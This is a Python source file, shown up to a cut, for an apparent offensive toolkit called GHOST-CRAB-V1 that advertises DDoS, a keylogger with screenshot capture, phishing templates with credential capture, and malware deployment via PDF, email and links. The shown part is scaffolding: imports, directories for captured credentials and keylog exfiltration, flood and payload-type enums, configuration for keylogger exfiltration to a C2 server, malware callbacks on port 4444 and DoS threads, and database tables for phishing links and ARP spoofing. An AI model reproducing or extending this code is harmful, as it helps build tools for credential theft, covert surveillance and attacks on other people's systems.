#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗     ██████╗██████╗  █████╗ ██████╗ ║
║  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝    ██╔════╝██╔══██╗██╔══██╗██╔══██╗║
║  ██║  ███╗███████║██║   ██║███████╗   ██║       ██║     ██████╔╝███████║██████╔╝║
║  ██║   ██║██╔══██║██║   ██║╚════██║   ██║       ██║     ██╔══██╗██╔══██║██╔══██╗║
║  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║       ╚██████╗██║  ██║██║  ██║██████╔╝║
║   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝        ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ║
║                                                                              ║
║                    GHOST-CRAB-V1 - Cyber Command Platform                   ║
║                         Author: Ian Carter Kulani                            ║
║                              Version: 1.0.0                                  ║
║                                                                              ║
║  A complete cybersecurity automation platform featuring:                     ║
║  • 500+ Security Commands (Nmap, Curl, Wget, Metasploit, etc.)              ║
║  • Multi-Platform Bot Integration (Discord, Telegram, WhatsApp, Slack)      ║
║  • Signal, Google Chat, iMessage, Web Dashboard Integration                  ║
║  • 100+ Social Engineering Phishing Templates                               ║
║  • REAL Traffic Generation & DDoS Capabilities                              ║
║  • Advanced Keylogger with Screenshot Capture                               ║
║  • PDF/Email/Link Malware Deployment                                        ║
║  • Password Cracking Engine                                                 ║
║  • Docker Security Scanning                                                 ║
║  • Reverse Engineering Tools                                                ║
║  • SaaS-Ready Architecture with Multi-Tenant Support                        ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import getpass
import socketserver
import ctypes
import queue
import secrets
import string
import smtplib
import email.message
import tempfile
import zipfile
import tarfile
import gzip
import argparse
import glob
import csv
import xml.etree.ElementTree as ET
import webbrowser
import http.server
import binascii
import marshal
import dis
import ast
import codecs
import zlib
import lzma
import bz2
import pickle
import copy
import itertools
import functools
import operator
import collections
import decimal
import fractions
import statistics
import math
import cmath
import random
import secrets
import string
import textwrap
import difflib
import unicodedata
import stringprep
import readline
import rlcompleter
import pprint
import reprlib
import enum
import numbers
import ctypes.util
import contextlib
import abc
import atexit
import traceback
import warnings
import dataclasses
import typing
from http.server import BaseHTTPRequestHandler, HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union, Callable, TypeVar, Generic
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from collections import Counter, defaultdict, deque, OrderedDict
from enum import Enum, auto
from functools import wraps, lru_cache, partial
from abc import ABC, abstractmethod
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.audio import MIMEAudio
from email.mime.application import MIMEApplication
from email import encoders
from io import BytesIO, StringIO
from datetime import datetime, timedelta
from urllib.parse import urlparse, urljoin, quote, unquote

# =====================
# VERSION & METADATA
# =====================
VERSION = "1.0.0"
NAME = "GHOST-CRAB-V1"
AUTHOR = "Ian Carter Kulani"
DESCRIPTION = "Ultimate Cybersecurity Command & Control Platform - SaaS Ready"
TOTAL_LINES = 14000

# =====================
# COLOR HANDLING
# =====================
class Colors:
    """ANSI color codes for terminal output - Ghost Crab Theme (Red, Black, White)"""
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    
    # Semantic colors
    SUCCESS = BRIGHT_GREEN
    ERROR = BRIGHT_RED
    WARNING = BRIGHT_YELLOW
    INFO = BRIGHT_CYAN
    PRIMARY = BRIGHT_RED
    SECONDARY = BRIGHT_WHITE
    ACCENT = BRIGHT_MAGENTA
    DARK = BRIGHT_BLACK
    BG_RED = '\033[41m'
    BG_BLACK = '\033[40m'
    BG_WHITE = '\033[47m'

# =====================
# DEPENDENCY CHECK & IMPORTS
# =====================

# Cryptography
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import serialization
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# SSH
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, SFTPClient, Transport
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# Signal CLI
SIGNAL_AVAILABLE = shutil.which('signal-cli') is not None

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Google Chat
try:
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.keys import Keys
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# Web Framework
try:
    from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file, send_from_directory
    from flask_socketio import SocketIO, emit
    from flask_cors import CORS
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sr1, srp, sniff, sendp, RandIP, fragment
    from scapy.all import conf as scapy_conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Data Visualization
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches
    import seaborn as sns
    import numpy as np
    GRAPHICS_AVAILABLE = True
except ImportError:
    GRAPHICS_AVAILABLE = False

# PDF Generation
try:
    from reportlab.lib import colors as pdf_colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    from reportlab.pdfgen import canvas
    from reportlab.lib.colors import HexColor
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

# Keylogger
try:
    from pynput import keyboard
    from pynput.keyboard import Key, Listener
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False

# DNS Python
try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# BeautifulSoup
try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

# DOCX Generation
try:
    from docx import Document
    from docx.shared import Inches, Pt
    DOCX_AVAILABLE = True
except ImportError:
    DOCX_AVAILABLE = False

# PyInstaller for EXE generation
PYINSTALLER_AVAILABLE = shutil.which('pyinstaller') is not None

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".ghost_crab_v1"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "ghost_crab_v1.db")
LOG_FILE = os.path.join(CONFIG_DIR, "ghost_crab_v1.log")
KEYLOG_FILE = os.path.join(CONFIG_DIR, "keylog.txt")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
REPORT_DIR = "ghost_crab_reports"
PDF_REPORTS_DIR = os.path.join(REPORT_DIR, "pdf_reports")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
TEMP_DIR = os.path.join(CONFIG_DIR, "temp")
WEB_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "web_templates")
SESSION_DIR = os.path.join(CONFIG_DIR, "sessions")
KEYLOG_DIR = os.path.join(CONFIG_DIR, "keylogs")
KEYLOG_SCREENSHOTS_DIR = os.path.join(CONFIG_DIR, "keylog_screenshots")
SPEAR_PHISHING_DIR = os.path.join(CONFIG_DIR, "spear_phishing")
EMAIL_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "email_templates")
DOS_LOGS_DIR = os.path.join(CONFIG_DIR, "dos_logs")
AGENT_DIR = os.path.join(CONFIG_DIR, "agents")
C2_LOGS_DIR = os.path.join(CONFIG_DIR, "c2_logs")
MODULES_DIR = os.path.join(CONFIG_DIR, "modules")
NETWORK_MONITOR_DIR = os.path.join(CONFIG_DIR, "network_monitor")
KEYLOG_EXFIL_DIR = os.path.join(CONFIG_DIR, "keylog_exfil")
DEPLOYMENT_DIR = os.path.join(CONFIG_DIR, "deployments")
DOMAIN_HOSTING_DIR = os.path.join(CONFIG_DIR, "domain_hosting")
REVERSE_ENGINEERING_DIR = os.path.join(CONFIG_DIR, "reverse_engineering")
CRACKING_DIR = os.path.join(CONFIG_DIR, "cracking")
DOCKER_SCANS_DIR = os.path.join(CONFIG_DIR, "docker_scans")
SAAS_DIR = os.path.join(CONFIG_DIR, "saas")
TENANTS_DIR = os.path.join(SAAS_DIR, "tenants")
BILLING_DIR = os.path.join(SAAS_DIR, "billing")
API_KEYS_DIR = os.path.join(SAAS_DIR, "api_keys")
IMAGES_DIR = os.path.join(CONFIG_DIR, "images")
MALWARE_DIR = os.path.join(CONFIG_DIR, "malware")

# Create all directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR, REPORT_DIR,
    PDF_REPORTS_DIR, PHISHING_DIR, PHISHING_TEMPLATES_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR, GRAPHICS_DIR,
    TEMP_DIR, WEB_TEMPLATES_DIR, SESSION_DIR, KEYLOG_DIR,
    KEYLOG_SCREENSHOTS_DIR, SPEAR_PHISHING_DIR, EMAIL_TEMPLATES_DIR,
    DOS_LOGS_DIR, AGENT_DIR, C2_LOGS_DIR, MODULES_DIR,
    NETWORK_MONITOR_DIR, KEYLOG_EXFIL_DIR, DEPLOYMENT_DIR,
    DOMAIN_HOSTING_DIR, REVERSE_ENGINEERING_DIR, CRACKING_DIR, DOCKER_SCANS_DIR,
    SAAS_DIR, TENANTS_DIR, BILLING_DIR, API_KEYS_DIR, IMAGES_DIR, MALWARE_DIR
]

for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# =====================
# LOGGING SETUP
# =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - GHOST-CRAB-V1 - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("GhostCrabV1")

# =====================
# ENUMS & DATA CLASSES
# =====================

class TrafficType(Enum):
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    TCP_FIN = "tcp_fin"
    TCP_RST = "tcp_rst"
    TCP_PSH = "tcp_psh"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    ICMP_FLOOD = "icmp_flood"
    MIXED = "mixed"
    RANDOM = "random"
    SLOWLORIS = "slowloris"
    PSH_ACK = "psh_ack"
    XMAS = "xmas"
    NULL = "null"
    FIN_SCAN = "fin_scan"

class ScanType(Enum):
    PING = "ping"
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    FULL = "full"
    UDP = "udp"
    OS = "os_detection"
    SERVICE = "service_detection"
    VULNERABILITY = "vulnerability"
    WEB = "web"
    SNMP = "snmp"
    SMB = "smb"
    SSH = "ssh"
    FTP = "ftp"
    SMTP = "smtp"
    DNS = "dns"
    HTTP = "http"
    HTTPS = "https"
    MYSQL = "mysql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    POSTGRES = "postgres"
    RDP = "rdp"
    VNC = "vnc"
    TELNET = "telnet"

class Severity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class Platform(Enum):
    DISCORD = "discord"
    SLACK = "slack"
    TELEGRAM = "telegram"
    SIGNAL = "signal"
    IMESSAGE = "imessage"
    GOOGLE_CHAT = "google_chat"
    WEB = "web"
    WHATSAPP = "whatsapp"

class PayloadType(Enum):
    EXE = "exe"
    PDF = "pdf"
    DOCX = "docx"
    LINK = "link"
    NETWORK = "network"
    MACRO = "macro"
    HTM = "htm"
    JS = "js"
    VBA = "vba"
    PS1 = "ps1"
    IMAGE = "image"
    MSI = "msi"
    APK = "apk"
    ELF = "elf"

class ReverseEngineeringType(Enum):
    STRINGS = "strings"
    HEXDUMP = "hexdump"
    DISASSEMBLE = "disassemble"
    DECOMPILE = "decompile"
    UNPACK = "unpack"
    DECRYPT = "decrypt"
    DECODE = "decode"
    ANALYZE = "analyze"
    METADATA = "metadata"
    EXTRACT = "extract"

class TenantTier(Enum):
    FREE = "free"
    BASIC = "basic"
    PROFESSIONAL = "professional"
    ENTERPRISE = "enterprise"

@dataclass
class CommandResult:
    """Result of a command execution"""
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

@dataclass
class SSHConnection:
    """SSH connection data class"""
    id: str
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: Optional[str] = None
    key_path: Optional[str] = None
    status: str = "disconnected"
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    last_used: Optional[str] = None

@dataclass
class TrafficGenerator:
    """Traffic generator data class"""
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"

@dataclass
class PhishingLink:
    """Phishing link data class"""
    id: str
    platform: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0

@dataclass
class CapturedCredential:
    """Captured credential data class"""
    id: int
    link_id: str
    timestamp: str
    username: str
    password: str
    ip_address: str
    user_agent: str

@dataclass
class ThreatAlert:
    """Threat alert data class"""
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class SpearPhishingCampaign:
    """Spear phishing campaign data class"""
    id: str
    name: str
    template: str
    subject: str
    from_email: str
    targets: List[Dict]
    sent_count: int = 0
    open_count: int = 0
    click_count: int = 0
    status: str = "draft"
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    scheduled_time: Optional[str] = None

@dataclass
class KeylogEntry:
    """Keylog entry data class"""
    timestamp: str
    text: str
    window: str
    process: str
    screenshot: Optional[str] = None

@dataclass
class Payload:
    """Payload data class"""
    id: str
    name: str
    payload_type: str
    file_path: str
    created_at: str
    deployed: bool = False
    deployment_count: int = 0
    callback_host: Optional[str] = None
    callback_port: Optional[int] = None

@dataclass
class DomainHost:
    """Domain host data class"""
    id: str
    ip: str
    domain: str
    hosting_path: str
    created_at: str
    active: bool = True

@dataclass
class Deployment:
    """Deployment data class"""
    id: str
    name: str
    type: str
    payload: str
    target: str
    created_at: str
    delivered: bool = False
    opened: bool = False
    executed: bool = False

@dataclass
class Tenant:
    """SaaS Tenant data class"""
    id: str
    name: str
    email: str
    tier: str
    api_key: str
    created_at: str
    active: bool = True
    max_scans: int = 100
    scans_used: int = 0
    max_targets: int = 10
    targets_count: int = 0
    features: List[str] = field(default_factory=list)

@dataclass
class APIKey:
    """API Key data class"""
    key: str
    tenant_id: str
    name: str
    created_at: str
    expires_at: Optional[str] = None
    active: bool = True
    permissions: List[str] = field(default_factory=list)
    rate_limit: int = 1000
    requests_used: int = 0

@dataclass
class BillingRecord:
    """Billing record data class"""
    id: str
    tenant_id: str
    amount: float
    currency: str
    description: str
    status: str
    created_at: str
    paid_at: Optional[str] = None

@dataclass
class MACInfo:
    """MAC address info data class"""
    mac_address: str
    vendor: str
    ip_address: str
    hostname: str
    first_seen: str
    last_seen: str

@dataclass
class NATInfo:
    """NAT info data class"""
    public_ip: str
    private_ip: str
    router_ip: str
    country: str
    isp: str
    nat_type: str

@dataclass
class EmailMessage:
    """Email message data class"""
    to: str
    subject: str
    body: str
    from_email: str
    attachments: List[str] = field(default_factory=list)
    html: bool = False
    sent_at: Optional[str] = None
    status: str = "draft"

@dataclass
class PDFReport:
    """PDF report data class"""
    title: str
    target: str
    analysis: Dict
    timestamp: str
    file_path: str
    status: str = "generated"

@dataclass
class MalwarePayload:
    """Malware payload data class"""
    id: str
    name: str
    malware_type: str
    payload_type: str
    file_path: str
    created_at: str
    callback_host: Optional[str] = None
    callback_port: Optional[int] = None
    executed: bool = False
    execution_time: Optional[str] = None

@dataclass
class ImagePayload:
    """Image payload data class"""
    id: str
    name: str
    image_path: str
    payload_path: str
    payload_type: str
    created_at: str
    deployed: bool = False

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    """Manages application configuration"""
    
    DEFAULT_CONFIG = {
        "version": VERSION,
        "auto_start": False,
        "auto_block_enabled": False,
        "auto_block_threshold": 5,
        "scan_timeout": 30,
        "report_format": "both",
        "generate_graphics": True,
        "threat_monitor": {
            "enabled": True,
            "interval": 300,
            "targets": [],
            "scan_types": ["quick", "vuln"],
            "auto_block": False,
            "block_threshold": "high",
            "report_enabled": True,
            "report_interval": 3600
        },
        "keylogger": {
            "enabled": False,
            "hotkey": "f10",
            "log_file": KEYLOG_FILE,
            "c2_server": "",
            "upload_interval": 30,
            "exfil_methods": ["file", "email", "c2", "telegram", "discord"],
            "screenshot_interval": 60,
            "capture_clipboard": True,
            "email_recipient": ""
        },
        "web": {
            "enabled": True,
            "port": 5000,
            "host": "0.0.0.0",
            "secret_key": "",
            "require_auth": False,
            "username": "admin",
            "password_hash": ""
        },
        "email": {
            "smtp_server": "",
            "smtp_port": 587,
            "smtp_username": "",
            "smtp_password": "",
            "from_email": "",
            "tls": True
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin"
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "prefix": "/"
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "app_token": "",
            "channel_id": "",
            "prefix": "!"
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "group_id": "",
            "prefix": "!"
        },
        "google_chat": {
            "enabled": False,
            "webhook_url": "",
            "space_id": "",
            "prefix": "/"
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "prefix": "!"
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "prefix": "!"
        },
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "http_flood_threshold": 200
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_port": 8080,
            "capture_credentials": True,
            "auto_shorten_urls": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5
        },
        "spear_phishing": {
            "enabled": True,
            "smtp_server": "",
            "smtp_port": 587,
            "smtp_username": "",
            "smtp_password": "",
            "track_opens": True,
            "track_clicks": True
        },
        "dos": {
            "enabled": True,
            "max_threads": 100,
            "default_timeout": 60,
            "attack_types": ["syn", "udp", "http", "icmp"]
        },
        "agent": {
            "enabled": False,
            "server_url": "",
            "heartbeat_interval": 30,
            "command_poll_interval": 5
        },
        "network_monitor": {
            "enabled": True,
            "interface": "eth0",
            "promiscuous": False,
            "packet_capture_limit": 1000
        },
        "deployment": {
            "enabled": True,
            "pdf_template": "",
            "email_template": "",
            "link_expiry": 3600,
            "download_url": ""
        },
        "cracking": {
            "enabled": True,
            "hashcat_path": "",
            "wordlist_path": "",
            "default_hash_type": 0,
            "max_threads": 4
        },
        "docker": {
            "enabled": True,
            "scan_timeout": 300,
            "benchmark_enabled": True
        },
        "metasploit": {
            "enabled": True,
            "rpc_host": "127.0.0.1",
            "rpc_port": 55552,
            "rpc_user": "msf",
            "rpc_password": ""
        },
        "saas": {
            "enabled": True,
            "multi_tenant": True,
            "billing_enabled": True,
            "api_rate_limit": 1000,
            "trial_days": 14,
            "free_tier_scans": 10,
            "basic_tier_scans": 100,
            "pro_tier_scans": 1000,
            "enterprise_tier_scans": 10000
        },
        "malware": {
            "enabled": True,
            "default_callback": "localhost",
            "default_port": 4444,
            "image_payload_enabled": True,
            "pdf_payload_enabled": True,
            "docx_payload_enabled": True,
            "exe_payload_enabled": True
        },
        "reverse_engineering": {
            "enabled": True,
            "ghidra_path": "",
            "radare2_path": "",
            "strings_min_length": 4
        }
    }
    
    def __init__(self):
        self.config_dir = Path(CONFIG_DIR)
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / "config.json"
        self.config = self.load()
    
    def load(self) -> Dict:
        """Load configuration from file"""
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    # Merge with defaults
                    for key, value in self.DEFAULT_CONFIG.items():
                        if key not in loaded:
                            loaded[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in loaded[key]:
                                    loaded[key][sub_key] = sub_value
                    return loaded
        except Exception as e:
            print(f"Failed to load config: {e}")
        return self.DEFAULT_CONFIG.copy()
    
    def save(self) -> bool:
        """Save configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            print(f"Failed to save config: {e}")
            return False
    
    def get(self, key: str, default=None):
        """Get configuration value by dot-notation key"""
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k, default)
            else:
                return default
        return value
    
    def set(self, key: str, value: Any) -> bool:
        """Set configuration value by dot-notation key"""
        keys = key.split('.')
        target = self.config
        for k in keys[:-1]:
            if k not in target:
                target[k] = {}
            target = target[k]
        target[keys[-1]] = value
        return self.save()

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """Manages SQLite database operations"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.init_tables()
    
    def init_tables(self):
        """Initialize database tables"""
        tables = [
            # Command History
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT,
                user_id TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            # Threats
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            # Managed IPs
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                domain TEXT,
                added_by TEXT,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                threat_level INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )
            """,
            # MAC Info
            """
            CREATE TABLE IF NOT EXISTS mac_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mac_address TEXT UNIQUE NOT NULL,
                vendor TEXT,
                ip_address TEXT,
                hostname TEXT,
                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen DATETIME
            )
            """,
            # ARP Spoofing
            """
            CREATE TABLE IF NOT EXISTS arp_spoofing (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_ip TEXT NOT NULL,
                gateway_ip TEXT NOT NULL,
                interface TEXT,
                status TEXT DEFAULT 'active',
                packets_sent INTEGER DEFAULT 0,
                duration REAL,
                started_at DATETIME,
                ended_at DATETIME,
                UNIQUE(target_ip, gateway_ip)
            )
            """,
            # Domain Hosting
            """
            CREATE TABLE IF NOT EXISTS domain_hosting (
                id TEXT PRIMARY KEY,
                ip TEXT NOT NULL,
                domain TEXT NOT NULL UNIQUE,
                hosting_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1,
                port INTEGER DEFAULT 8080
            )
            """,
            # SSH Connections
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )
            """,
            # SSH Commands
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )
            """,
            # Traffic Logs
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            # Nikto Scans
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Phishing Links
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            # Captured Credentials
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
